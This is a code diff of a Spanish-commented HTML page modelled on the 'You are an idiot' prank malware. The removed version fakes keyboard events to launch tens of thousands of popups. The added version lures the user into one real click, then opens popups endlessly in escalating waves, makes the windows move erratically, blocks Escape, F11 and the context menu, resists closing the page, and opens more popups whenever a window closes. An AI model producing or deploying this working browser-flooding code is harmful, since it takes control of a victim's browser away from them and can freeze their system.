@@ -2,160 +2,332 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>You are an idiot</title>
-</head>
-<body style="background:#fff;overflow:hidden;margin:0;cursor:none;">
-
-<h1 style="font-size:10vw;font-family:Arial;text-align:center;margin-top:20vh;animation:fl 0.1s infinite;">
-YOU ARE AN IDIOT
-</h1>
+<title>POPUP CHAIN REACTION</title>
 <style>
-@keyframes fl { 0%,100%{opacity:1} 50%{opacity:0} }
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+    background: #0a0a0a;
+    overflow: hidden;
+    width: 100vw;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Courier New', monospace;
+    color: #ff3333;
+    cursor: none;
+    user-select: none;
+}
+h1 {
+    font-size: 5vw;
+    text-align: center;
+    animation: blink 0.08s infinite;
+    text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
+}
+.sub {
+    color: #aa0000;
+    font-size: 1.5vw;
+    margin-top: 20px;
+    animation: blink 0.15s infinite;
+}
+.click-instruction {
+    position: fixed;
+    bottom: 40px;
+    color: #666;
+    font-size: 1.2vw;
+    animation: pulse 1s ease-in-out infinite;
+    cursor: pointer;
+    z-index: 9999;
+    padding: 20px;
+    background: rgba(255,0,0,0.1);
+    border: 1px solid #ff000044;
+    border-radius: 8px;
+}
+.click-instruction:hover {
+    background: rgba(255,0,0,0.2);
+}
+@keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+}
+@keyframes pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.05); }
+}
 </style>
+</head>
+<body>
+
+<h1>⚠ YOU ARE AN IDIOT ⚠</h1>
+<div class="sub">self-replicating popup storm</div>
+
+<div class="click-instruction" id="triggerBtn">
+    [ CLICK HERE TO START THE CHAIN REACTION ]
+</div>
 
 <script>
 // ================================================================
-// TÉCNICA REAL: BOMBARDEO DE EVENTOS SINTÉTICOS
+// ESTRATEGIA: CHAIN REACTION con USER ACTIVATION real
+// ================================================================
+// Una vez que el usuario hace CLICK REAL (no sintético),
+// el navegador otorga "transient activation" (aprox. 5 segundos).
+// Durante ese tiempo, window.open() funciona.
+// Cada popup que se abre también recibe transient activation
+// y puede abrir más popups.
+//
+// CLAVE: Los popups contienen el MISMO script, así que
+// cuando se cargan, inmediatamente intentan abrir más popups
+// mientras aún tienen "user activation" del padre.
 // ================================================================
 
-// Cada popup necesita un evento de usuario individual.
-// Creamos miles de eventos keydown y los disparamos.
-// CADA evento abre UN popup.
-
-var wins = [];
-var totalAbiertas = 0;
-var MAX = 50000; // Máximo de ventanas a abrir
+var totalWindowsOpened = 0;
+var MAX_WINDOWS = 100000; // sin límite práctico
+var isActive = false;
 
 // ================================================================
-// 1. CREAR UN KEYDOWN FALSO Y ABRIR UN POPUP
+// HACER BAILAR LAS VENTANAS (efecto visual)
 // ================================================================
 
-function dispararUnPopup(url) {
-    if (totalAbiertas >= MAX) return;
+function makeWindowDance(win) {
+    if (!win || win.closed) return;
     
-    // Escuchamos el evento UNA SOLA VEZ
-    function handler(e) {
-        document.removeEventListener('keydown', handler);
-        
-        try {
-            var nombreUnico = 'w' + Date.now() + '_' + totalAbiertas + '_' + Math.random().toString(36).substr(2,6);
-            var p = window.open(url, nombreUnico,
-                'width=180,height=175,left=' + (Math.random() * screen.width) + ',top=' + 
-                (Math.random() * screen.height) + ',menubar=no,status=no,toolbar=no,resizable=no,scrollbars=no');
-            
-            if (p && !p.closed) {
-                wins.push(p);
-                totalAbiertas++;
-                // Hacer que baile
-                hacerBailar(p);
-            }
-        } catch(e) {}
-    }
-    
-    document.addEventListener('keydown', handler);
-    
-    // Disparamos el evento sintético
-    var evt = new KeyboardEvent('keydown', {
-        key: 'Enter', keyCode: 13, which: 13,
-        code: 'Enter', bubbles: true, cancelable: true
-    });
-    document.dispatchEvent(evt);
-}
-
-// ================================================================
-// 2. HACER BAILAR LAS VENTANAS
-// ================================================================
-
-function hacerBailar(p) {
     var x = Math.random() * (screen.width - 200);
     var y = Math.random() * (screen.height - 200);
     var dx = (Math.random() - 0.5) * 30;
     var dy = (Math.random() - 0.5) * 30;
+    var angle = 0;
     
-    function baila() {
-        if (!p || p.closed) return;
+    function dance() {
+        if (!win || win.closed) return;
         try {
-            x += dx; y += dy;
-            if (x < 0 || x > screen.width - 180) dx *= -1;
-            if (y < 0 || y > screen.height - 175) dy *= -1;
-            if (Math.random() < 0.05) { dx = (Math.random()-0.5)*40; dy = (Math.random()-0.5)*40; }
-            p.moveTo(Math.round(x), Math.round(y));
-            try { p.focus(); } catch(e) {}
-            setTimeout(baila, 8);
+            // Movimiento errático tipo "mosca"
+            x += dx;
+            y += dy;
+            
+            // Cambiar dirección aleatoriamente
+            if (Math.random() < 0.03) {
+                dx = (Math.random() - 0.5) * 40;
+                dy = (Math.random() - 0.5) * 40;
+            }
+            
+            // Rebotar en bordes
+            if (x < 0 || x > screen.width - 180) { dx *= -1; x += dx * 2; }
+            if (y < 0 || y > screen.height - 175) { dy *= -1; y += dy * 2; }
+            
+            win.moveTo(Math.round(x), Math.round(y));
+            
+            // Rotar tamaño periódicamente
+            if (Math.random() < 0.01) {
+                try {
+                    win.resizeTo(
+                        160 + Math.random() * 60,
+                        155 + Math.random() * 60
+                    );
+                } catch(e) {}
+            }
+            
+            setTimeout(dance, 5 + Math.random() * 10);
         } catch(e) {
-            setTimeout(baila, 50);
+            setTimeout(dance, 100);
         }
     }
-    baila();
+    
+    dance();
 }
 
 // ================================================================
-// 3. PROCREATE (al cerrar)
+// ABRIR UN POPUP (usa transient activation del click real)
+// ================================================================
+
+function openPopup(url) {
+    if (totalWindowsOpened >= MAX_WINDOWS) return null;
+    
+    try {
+        var uniqueName = 'p' + Date.now() + '_' + totalWindowsOpened + '_' + 
+                         Math.random().toString(36).substr(2, 8);
+        
+        var win = window.open(url, uniqueName,
+            'width=' + (160 + Math.random() * 40) + 
+            ',height=' + (155 + Math.random() * 40) + 
+            ',left=' + Math.random() * screen.width + 
+            ',top=' + Math.random() * screen.height + 
+            ',menubar=no,toolbar=no,status=no,resizable=yes,scrollbars=no'
+        );
+        
+        if (win && !win.closed) {
+            totalWindowsOpened++;
+            document.title = 'POPUPS: ' + totalWindowsOpened;
+            makeWindowDance(win);
+            return win;
+        }
+    } catch(e) {}
+    
+    return null;
+}
+
+// ================================================================
+// LANZAMIENTO EN CADENA (fases progresivas)
+// ================================================================
+
+function launchChainReaction() {
+    if (!isActive) return;
+    
+    // FASE 1: Ráfaga inicial (100 popups en 1 segundo)
+    console.log('[FASE 1] Iniciando ráfaga inicial...');
+    for (var i = 0; i < 100; i++) {
+        setTimeout(function() {
+            if (isActive) openPopup('open.html');
+        }, i * 10);
+    }
+    
+    // FASE 2: Segunda oleada (500 en 2.5 segundos)
+    setTimeout(function() {
+        if (!isActive) return;
+        console.log('[FASE 2] Segunda oleada...');
+        for (var i = 0; i < 500; i++) {
+            setTimeout(function() {
+                if (isActive) openPopup('open.html');
+            }, i * 5);
+        }
+    }, 1500);
+    
+    // FASE 3: Tormenta total (2000 en 4 segundos)
+    setTimeout(function() {
+        if (!isActive) return;
+        console.log('[FASE 3] Tormenta total...');
+        for (var i = 0; i < 2000; i++) {
+            setTimeout(function() {
+                if (isActive) openPopup('open.html');
+            }, i * 2);
+        }
+    }, 5000);
+    
+    // FASE 4: REFUERZO INFINITO (abrir popups continuamente)
+    setTimeout(function() {
+        if (!isActive) return;
+        console.log('[FASE 4] Refuerzo infinito activado.');
+        
+        // Cada 10ms intentamos abrir un popup
+        var infiniteReforce = setInterval(function() {
+            if (!isActive) {
+                clearInterval(infiniteReforce);
+                return;
+            }
+            openPopup('open.html');
+        }, 10);
+        
+        // Además, cada 500ms abrimos 20 rápidos
+        var burstReforce = setInterval(function() {
+            if (!isActive) {
+                clearInterval(burstReforce);
+                return;
+            }
+            for (var i = 0; i < 20; i++) {
+                setTimeout(function() {
+                    if (isActive) openPopup('open.html');
+                }, i * 2);
+            }
+        }, 500);
+        
+    }, 10000);
+}
+
+// ================================================================
+// PROCREATE: Cuando se cierra una ventana, abrir más
 // ================================================================
 
 function procreate() {
-    for (var i = 0; i < 40; i++) {
-        setTimeout(function() { dispararUnPopup('open.html'); }, i * 5);
+    if (!isActive) return;
+    for (var i = 0; i < 30; i++) {
+        setTimeout(function() {
+            if (isActive) openPopup('open.html');
+        }, i * 5);
     }
 }
 
 // ================================================================
-// 4. LANZAMIENTO MASIVO
+// EVENTO DE CLICK REAL (el usuario debe hacer click)
 // ================================================================
 
-function lanzarTormenta() {
-    // FASE 1: 500 popups en 5 segundos (100 por segundo)
-    for (var i = 0; i < 500; i++) {
-        setTimeout(function() { dispararUnPopup('open.html'); }, i * 10);
+document.getElementById('triggerBtn').addEventListener('click', function(e) {
+    // Prevenir comportamiento por defecto
+    e.preventDefault();
+    e.stopPropagation();
+    
+    if (isActive) return;
+    isActive = true;
+    
+    console.log('[!!!] CLICK REAL DETECTADO - INICIANDO CHAIN REACTION');
+    
+    // Ocultar el botón
+    this.style.opacity = '0.3';
+    this.textContent = '[ CHAIN REACTION ACTIVE - ' + totalWindowsOpened + ' POPUPS ]';
+    
+    // Actualizar contador
+    setInterval(function() {
+        var btn = document.getElementById('triggerBtn');
+        if (btn) {
+            btn.textContent = '[ CHAIN REACTION ACTIVE - ' + totalWindowsOpened + ' POPUPS ]';
+        }
+    }, 500);
+    
+    // Bloquear cierre
+    window.onbeforeunload = function() {
+        return 'Are you sure you want to stop the chain reaction?';
+    };
+    
+    // Bloquear teclas de escape
+    window.addEventListener('keydown', function(ev) {
+        var key = ev.key || ev.keyCode;
+        if (key === 'Escape' || key === 27 || key === 'F11' || key === 122) {
+            ev.preventDefault();
+            ev.stopPropagation();
+            return false;
+        }
+    }, true);
+    
+    // Bloquear context menu
+    document.addEventListener('contextmenu', function(ev) {
+        ev.preventDefault();
+        return false;
+    });
+    
+    // Procreate al cerrar
+    window.addEventListener('beforeunload', function() {
+        procreate();
+    });
+    
+    // Iniciar la cadena
+    launchChainReaction();
+    
+    // También abrir popups directamente desde el evento de click
+    for (var i = 0; i < 50; i++) {
+        setTimeout(function() {
+            openPopup('open.html');
+        }, i * 5);
     }
-    
-    // FASE 2: 1000 popups más (200 por segundo)
-    setTimeout(function() {
-        for (var i = 0; i < 1000; i++) {
-            setTimeout(function() { dispararUnPopup('open.html'); }, i * 5);
-        }
-    }, 6000);
-    
-    // FASE 3: 3000 popups más (300 por segundo)
-    setTimeout(function() {
-        for (var i = 0; i < 3000; i++) {
-            setTimeout(function() { dispararUnPopup('open.html'); }, i * 3);
-        }
-    }, 12000);
-    
-    // FASE 4: Oleada infinita — 50 cada segundo para siempre
-    setInterval(function() {
-        for (var i = 0; i < 50; i++) {
-            setTimeout(function() { dispararUnPopup('open.html'); }, i * 2);
-        }
-    }, 1000);
-    
-    // Refuerzo constante: 1 cada 5ms (200/segundo)
-    setInterval(function() {
-        dispararUnPopup('open.html');
-    }, 5);
-}
+});
 
 // ================================================================
-// 5. INICIO
+// TAMBIÉN al cargar la página, preparar
 // ================================================================
 
-// Forzar fullscreen
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('Página cargada. Esperando click del usuario...');
+});
+
+// Si ya hay transient activation al cargar (poco probable, pero posible),
+// intentar abrir algunos
 try {
-    var d = document.documentElement;
-    (d.requestFullscreen || d.webkitRequestFullscreen || d.mozRequestFullScreen || d.msRequestFullscreen).call(d);
+    var test = window.open('', 'test_' + Date.now(), 
+        'width=100,height=100,left=-2000,top=-2000');
+    if (test) {
+        test.close();
+        // Si llegamos aquí, ya tenemos activation
+        console.log('Ya hay transient activation al cargar!');
+    }
 } catch(e) {}
-
-// Bloquear teclas
-window.onbeforeunload = function() { return " "; };
-window.onkeydown = document.onkeydown = function(e) { e.preventDefault(); return false; };
-document.oncontextmenu = function(e) { e.preventDefault(); return false; };
-
-// Primera descarga masiva
-setTimeout(lanzarTormenta, 500);
-
-// Si se cierra la ventana, más
-window.onunload = procreate;
 </script>
 
 </body>
